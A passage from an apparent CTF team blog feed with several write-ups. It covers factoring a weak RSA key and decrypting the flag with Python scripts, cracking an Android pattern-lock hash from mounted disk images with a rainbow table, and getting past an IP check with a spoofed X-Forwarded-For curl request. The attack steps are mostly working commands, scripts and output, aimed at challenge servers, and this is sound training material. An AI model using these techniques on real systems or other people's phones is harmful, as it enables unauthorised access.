<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt;; ../../../../../crl/RSA2/bin/yafu <span class="string">"factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)"</span> -threads 10</div><div class="line"></div><div class="line"></div><div class="line">fac: factoring 98099407767975360290660227117126057014537157468191654426411230468489043009977</div><div class="line">fac: using pretesting plan: normal</div><div class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</div><div class="line"></div><div class="line">starting SIQS on c77: 98099407767975360290660227117126057014537157468191654426411230468489043009977</div><div class="line"></div><div class="line">==== sieving <span class="keyword">in</span> progress (10 threads):   36224 relations needed ====</div><div class="line">====            Press ctrl-c to abort and save state            ====</div><div class="line"></div><div class="line"></div><div class="line">SIQS elapsed time = 1.9290 seconds.</div><div class="line">Total factoring time = 2.0017 seconds</div><div class="line"></div><div class="line"></div><div class="line">***factors found***</div><div class="line"></div><div class="line">P39 = 315274063651866931016337573625089033553</div><div class="line">P39 = 311155972145869391293781528370734636009</div><div class="line"></div><div class="line">ans = 1</div></pre></td></tr></table></figure>
<p>Now that we have the p and q we can get the private key using rsatool(<a href="https://github.com/ius/rsatool" target="_blank" rel="external">https://github.com/ius/rsatool</a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; rsatool/rsatool.py -p 311155972145869391293781528370734636009 -q 315274063651866931016337573625089033553 -e 12405943493775545863 -o priv.key</div><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; cat priv.key </div><div class="line">-----BEGIN RSA PRIVATE KEY-----</div><div class="line">MIGwAgEAAiEA2OJMEre5nv4Km8BKaj31iiqUQmm0krc3bfEpAj8gYbkCCQCsKsPgyg9WBwIgHtnK</div><div class="line">UU3mNRl9yzxb34oYadECnCy7c1afLXiBA6d8n7cCEQDqFnXdoXEPZrAQBssgWxvpAhEA7S+Tc+wB</div><div class="line">hnqru7wF2RkFUQIQNRmCtiEP0S+6uyda8zCbJwIRAJ5Uoh8oF1sz+8MdyveAYncCEB/QjyrzneAo</div><div class="line">X5X8HRjafQM=</div><div class="line">-----END RSA PRIVATE KEY-----</div></pre></td></tr></table></figure>
<p>And now writing a little script with python to decrypt our cipher text:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, PKCS1_OAEP</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span><span class="params">(privkey,message)</span>:</span></div><div class="line">    key = open(privkey, <span class="string">"r"</span>).read()</div><div class="line">    dsize = SHA.digest_size  </div><div class="line">    sentinel = Random.new().read(<span class="number">15</span>+dsize)</div><div class="line">    rsakey = RSA.importKey(key)</div><div class="line">    rsakey = PKCS1_v1_5.new(rsakey)</div><div class="line">    decrypted = rsakey.decrypt(b64decode(message), <span class="keyword">None</span>)</div><div class="line">    <span class="keyword">return</span> decrypted</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> decrypt_RSA(<span class="string">'priv.key'</span>, sys.argv[<span class="number">1</span>])</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py $(cat flag.enc | tr -d <span class="string">'\n'</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"rsa2.py"</span>, line 20, <span class="keyword">in</span> &lt;module&gt;;</div><div class="line">    <span class="built_in">print</span> decrypt_RSA(<span class="string">'priv.key'</span>, sys.argv[1])</div><div class="line">  File <span class="string">"rsa2.py"</span>, line 16, <span class="keyword">in</span> decrypt_RSA</div><div class="line">    decrypted = rsakey.decrypt(b64decode(message), None)</div><div class="line">  File <span class="string">"/home/kinyabitch/ctf/asis-2016/ppc/SecuPrim/.env/local/lib/python2.7/site-packages/Crypto/Cipher/PKCS1_v1_5.py"</span>, line 204, <span class="keyword">in</span> decrypt</div><div class="line">    raise ValueError(<span class="string">"Ciphertext with incorrect length."</span>)</div><div class="line">ValueError: Ciphertext with incorrect length.</div></pre></td></tr></table></figure>
<p>But we failed, incorrect length? remember this part of the code from server.py ?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">flag = open(<span class="string">'flag'</span>, <span class="string">'r'</span>).read() * <span class="number">30</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        n = p * q</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</div><div class="line">            d = gmpy.invert(e, phi)</div><div class="line">            pubkey = RSA.construct((long(n), long(e)))</div><div class="line">            key = PKCS1_v1_5.new(pubkey)</div><div class="line">            enc = key.encrypt(msg).encode(<span class="string">'base64'</span>)</div><div class="line">            <span class="keyword">return</span> enc</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            p = gmpy.next_prime(p**<span class="number">2</span> + q**<span class="number">2</span>)</div><div class="line">            q = gmpy.next_prime(<span class="number">2</span>*p*q)</div><div class="line">            e = gmpy.next_prime(e**<span class="number">2</span>)</div></pre></td></tr></table></figure>
<p>Yes the flag is being multiplied by 30 times so is going to be very big, and if you notice the try catch is used , so when an error occurs  (length error) it updates our p,q and e getting the next primes!, so we had the wrong pubkey which only works for small cipher texts what we need to do here is to modify this encrypt script so we can get the next p,q,e with a very big string to make sure we can decrypt the original cipher text by simply modify our decrypt file</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> gmpy</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_rsa_encrypt</span><span class="params">(p, q, e, msg)</span>:</span></div><div class="line">  m = bytes_to_long(msg)</div><div class="line">  c = <span class="number">0</span></div><div class="line">  <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="comment">#print 'loop started'</span></div><div class="line">    n = p * q</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">      phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</div><div class="line">      d = gmpy.invert(e, phi)</div><div class="line">      pubkey = RSA.construct((long(n), long(e)))</div><div class="line">      f = open(<span class="string">'possiblekeys'</span>, <span class="string">'a+'</span>)</div><div class="line">      f.write(<span class="string">'%d,%d,%d,%d\n'</span> % (p,q,n,e))</div><div class="line">      f.close()</div><div class="line">      key = PKCS1_v1_5.new(pubkey)</div><div class="line">      enc = key.encrypt(msg).encode(<span class="string">'base64'</span>)</div><div class="line">      <span class="keyword">return</span> enc</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">      c += <span class="number">1</span></div><div class="line">      p = gmpy.next_prime(p**<span class="number">2</span> + q**<span class="number">2</span>)</div><div class="line">      q = gmpy.next_prime(<span class="number">2</span>*p*q)</div><div class="line">      e = gmpy.next_prime(e**<span class="number">2</span>)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">  sys.stdout.write( ext_rsa_encrypt(<span class="number">311155972145869391293781528370734636009</span>, <span class="number">315274063651866931016337573625089033553</span>, <span class="number">12405943493775545863</span>, <span class="string">"ASIS&#123;IM_A_LEET_AND_BIG_FUCKING_STRING_OMG_PLZ&#125;"</span> * <span class="number">100</span>))</div></pre></td></tr></table></figure>
<p>And now generating the private keys and trying to decrypt the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5, PKCS1_OAEP</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span><span class="params">(privkey,message)</span>:</span></div><div class="line">    key = open(privkey, <span class="string">"r"</span>).read()</div><div class="line">    dsize = SHA.digest_size  </div><div class="line">    sentinel = Random.new().read(<span class="number">15</span>+dsize)</div><div class="line">    rsakey = RSA.importKey(key)</div><div class="line">    rsakey = PKCS1_v1_5.new(rsakey)</div><div class="line">    decrypted = rsakey.decrypt(b64decode(message), <span class="keyword">None</span>)</div><div class="line">    <span class="keyword">return</span> decrypted</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#print decrypt_RSA('priv.key', sys.argv[1])</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    f = open(<span class="string">'possiblekeys'</span>, <span class="string">'r'</span>)</div><div class="line">    pqde = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line">        d = &#123;&#125;</div><div class="line">        <span class="comment"># print i</span></div><div class="line">        l = i.split(<span class="string">','</span>)</div><div class="line">        d[<span class="string">'p'</span>] = l[<span class="number">0</span>]</div><div class="line">        d[<span class="string">'q'</span>] = l[<span class="number">1</span>]</div><div class="line">        d[<span class="string">'n'</span>] = l[<span class="number">2</span>]</div><div class="line">        d[<span class="string">'e'</span>] = l[<span class="number">3</span>]</div><div class="line">        pqde.append(d)</div><div class="line">    c = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> pqde:</div><div class="line">        subprocess.check_output([<span class="string">"rsatool/rsatool.py"</span>, <span class="string">'-p'</span>, <span class="string">'%s'</span> % d[<span class="string">'p'</span>], <span class="string">'-q'</span>, <span class="string">'%s'</span> % d[<span class="string">'q'</span>], <span class="string">'-e'</span>, <span class="string">'%s'</span> % d[<span class="string">'e'</span>], <span class="string">'-o'</span>, <span class="string">'privkeys/priv%d.key'</span> % c])</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">print</span> decrypt_RSA(<span class="string">'privkeys/priv%d.key'</span> % c, sys.argv[<span class="number">1</span>])</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">print</span> e</div><div class="line">        c += <span class="number">1</span></div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py (cat flag.enc | tr -d <span class="string">'\n'</span>)</div><div class="line">Ciphertext with incorrect length.</div><div class="line">Ciphertext with incorrect length.</div><div class="line">Ciphertext with incorrect length.</div><div class="line">Ciphertext with incorrect length.</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div><div class="line">ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 4.18&lt;br&gt;Rating Count: 22&lt;br&gt;You Rated: Not rated&lt;br&gt;Points&lt;br&gt;113&lt;br&gt;Solves&lt;br&gt;64&lt;br&gt;Category&lt;br&gt;Crypto&lt;br&gt;Descript
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="RSA" scheme="https://teamrocketist.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>Ctfx [Forensics] - iTrash 100 points</title>
    <link href="https://teamrocketist.github.io/2016/08/29/Ctfx-Forensics-iTrash-100-points/"/>
    <id>https://teamrocketist.github.io/2016/08/29/Ctfx-Forensics-iTrash-100-points/</id>
    <published>2016-08-29T22:38:55.000Z</published>
    <updated>2017-08-10T02:39:42.551Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>I got locked out of my iTrash :(<br><br>1 2 3<br>4 5 6<br>7 8 9<br><br>Flag format: ctf(n-n-…-n)<br><br>link: <a href="https://mega.nz/#!6BEFAbpT!osYCbKNxHcwlqtJnhMuBe4tiG2CFAcx9sZCXD9eDjSg" target="_blank" rel="external">https://mega.nz/#!6BEFAbpT!osYCbKNxHcwlqtJnhMuBe4tiG2CFAcx9sZCXD9eDjSg</a><br></blockquote>

<p>The description of the problem is clear we need to find out what is the android pattern lock key combination:</p>
<p><img src="http://www.hk-android.info/wp-content/uploads/2011/11/Android-Pattern-Lock.jpg"></p>
<p>After unzipping the file we find a bunch of .img files, so the next step is to mount the android file system:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/0</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/1</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/2</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; ls</div><div class="line">cache.img  config.ini  emulator-user.ini  hardware-qemu.ini  userdata.img  userdata-qemu.img</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.img</div><div class="line">Disk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata-qemu.img </div><div class="line">Disk userdata-qemu.img: 550 MiB, 576716800 bytes, 1126400 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata-qemu.img /mnt/0/</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.img </div><div class="line">Disk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata.img /mnt/1/</div><div class="line">kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop cache.img /mnt/2/</div></pre></td></tr></table></figure>
<p>After mounting the system we need to find a file named “gesture.key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian /mnt&gt; sudo find . -name <span class="string">'gesture.key'</span></div><div class="line">[sudo] password <span class="keyword">for</span> kinyabitch: </div><div class="line">./0/system/gesture.key</div></pre></td></tr></table></figure>
<p>So out file is located at system/ folder :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian /m/0/system&gt; cat gesture.key | xxd -p </div><div class="line">c4bca3d13ba42982f6ee402262e2059c082bfce3</div></pre></td></tr></table></figure>
<p>I found a hash which according to the documentation is SHA-1 due to fact that we have very finite possible pattern combinations and the other fact that Android OS does not use a salted hash, it does not take a lot to generate a dictionary containing all possible hashes of sequences from 0123 to 876543210. I found one dictionary online you can download it here (<a href="http://www.mediafire.com/download/qs0sq5h8e2ly8jg/SHA1-android-pattern.rar" target="_blank" rel="external">http://www.mediafire.com/download/qs0sq5h8e2ly8jg/SHA1-android-pattern.rar</a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/c/f/itrash&gt; unrar e SHA1-android-pattern.rar </div><div class="line"></div><div class="line">UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal</div><div class="line"></div><div class="line"></div><div class="line">Extracting from SHA1-android-pattern.rar</div><div class="line"></div><div class="line">password: www.marw0rm.com</div><div class="line"></div><div class="line">Enter password (will not be echoed) <span class="keyword">for</span> GestureRainbowTable.db: </div><div class="line"></div><div class="line">Extracting  GestureRainbowTable.db                                    OK </div><div class="line">All OK</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/c/f/itrash&gt; sqlite3 GestureRainbowTable.db </div><div class="line">SQLite version 3.14.1 2016-08-11 18:53:32</div><div class="line">Enter <span class="string">'.help'</span> <span class="keyword">for</span> usage hints.</div><div class="line">sqlite&gt; .tables</div><div class="line">RainbowTable</div><div class="line">sqlite&gt; select * from RainBowTable <span class="built_in">where</span> <span class="built_in">hash</span> = <span class="string">'c4bca3d13ba42982f6ee402262e2059c082bfce3'</span></div><div class="line">   ...&gt; ;</div><div class="line">c4bca3d13ba42982f6ee402262e2059c082bfce3|[6, 4, 7, 3, 8, 5, 0, 1, 2]</div></pre></td></tr></table></figure>
<p>Swapping your fingers from that order you would get in the android device!<br><img src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/081913_1401_AndroidFore3.png"></p>
<p>Finally the flag is ctf(6, 4, 7, 3, 8, 5, 0, 1, 2).</p>
<p>For a more detailed info for this subject you can read this article <a href="http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/" target="_blank" rel="external">http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;I got locked out of my iTrash :(&lt;br&gt;&lt;br&gt;1 2 3&lt;br&gt;4 5 6&lt;br&gt;7 8 9&lt;br&gt;&lt;br&gt;Flag format: ctf(n-n-…-n)&lt;br&gt;&lt;br&gt;link: &lt;a href=&quot;h
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctfx [Web] – north korea [100pts]</title>
    <link href="https://teamrocketist.github.io/2016/08/29/ctfx-Web-%E2%80%93-north-korea-100pts/"/>
    <id>https://teamrocketist.github.io/2016/08/29/ctfx-Web-–-north-korea-100pts/</id>
    <published>2016-08-29T00:03:20.000Z</published>
    <updated>2017-08-10T03:03:18.198Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> What is North Korea hiding?<br><br><a href="http://problems.ctfx.io:7002/" target="_blank" rel="external">http://problems.ctfx.io:7002/</a><br></blockquote>

<p>This one was a really easy one, first thing i did was inspecting the source code and I found endpoint <a href="http://problems.ctfx.io:7002/code" target="_blank" rel="external">http://problems.ctfx.io:7002/code</a> tryed to access it but it was just giving a message “nice try kido!”. At the main page there is a special hint about this saying “We, the Democratic People’s Republic of Korea, have developed a revolutionary new security standard. The West doesn’t stand a chance.” So the West doesn’t have access? so lets try with a north korea ip changing the X-Forwarded.For header.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian /v/w/html&gt; curl -H <span class="string">"X-Forwarded-For: 175.45.177.64"</span> http://problems.ctfx.io:7002/code</div><div class="line">ctf(jk_we_aint_got_n0_nuk35)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; What is North Korea hiding?&lt;br&gt;&lt;br&gt;&lt;a href=&quot;http://problems.ctfx.io:7002/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://problems.c
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="X-Forwarded-For" scheme="https://teamrocketist.github.io/tags/X-Forwarded-For/"/>
    
  </entry>
  
  <entry>
    <title>ctfx [Web] - HarambeHub [100pts]</title>
    <link href="https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/"/>
    <id>https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/</id>
    <published>2016-08-28T23:49:36.000Z</published>
    <updated>2017-08-10T02:41:26.043Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>This site was created in honor of harambe: <a href="http://problems.ctfx.io:7003/" target="_blank" rel="external">http://problems.ctfx.io:7003/</a><br>Problem author: omegablitz<br><a href="http://compete.ctfx.io/download?file_key=0d7414507eb86f68d615a1b29777964b9f8abc8c4cce3f68364bc1a2b9ac3aae&team_key=396a50d69c10b7b12cab398e322320aff517fd16dc2b2ccfd71da1d6ee4e1b54" target="_blank" rel="external">HarambeHub.java</a><br><a href="http://compete.ctfx.io/download?file_key=79e8734839204206ba08ec90f9919002a19507592bafd5924d3d0ac0a07a5e04&team_key=396a50d69c10b7b12cab398e322320aff517fd16dc2b2ccfd71da1d6ee4e1b54" target="_blank" rel="external">User.java</a><br></blockquote>

<p>Two java files are given, analyzing both we can see that on the first file there is an “if condition” that is using string.match for username to check if it exists, knowning this we can get the admin username character by character with a python script by regex injecting.</p>
